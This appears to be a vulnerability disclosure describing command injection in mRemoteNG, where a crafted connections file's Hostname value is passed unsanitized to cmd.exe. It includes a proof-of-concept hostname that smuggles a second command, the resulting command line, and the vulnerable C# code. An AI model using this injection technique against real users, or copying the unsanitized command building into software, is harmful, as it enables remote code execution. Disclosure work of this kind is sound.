# mRemoteNG RCE via Malicious Connection File

An attacker delivers a crafted .mrng connections file — via phishing, a shared team connections store, or a compromised SQL backend. The victim opens the file in mRemoteNG and double-clicks the connection entry. On installations where Reconnect to previously opened sessions is enabled (OpenConsFromLastSession = true), no click is required — the connection fires automatically on file load.

Proof of concept (Hostname attribute in connections XML):
a &amp; cmd /c echo pwned &gt; C:\Users\Public\poc.txt &amp; rem

Resulting cmd.exe invocation:
cmd.exe /K ssh a & cmd /c echo pwned > C:\Users\Public\poc.txt & rem

ssh a fails immediately; the injected command executes unconditionally due to &.

### `mRemoteNG/Connection/Protocol/Terminal/Connection.Protocol.Terminal.cs, lines 53–74:`

```
  string sshCommand = "ssh";
  if (!string.IsNullOrEmpty(username))
      sshCommand += $" {username}@{_connectionInfo.Hostname}";  // no sanitization
  else
      sshCommand += $" {_connectionInfo.Hostname}";             // no sanitization

  arguments = $"/K {sshCommand}";
  _consoleControl.StartProcess(terminalExe, arguments);         // cmd.exe /K <injected>
```
terminalExe resolves to %COMSPEC% (typically cmd.exe). The &, |, >, <, ^ metacharacters are unblocked. The Hostname and Username fields are read directly from the connections XML file with no validation at any layer.
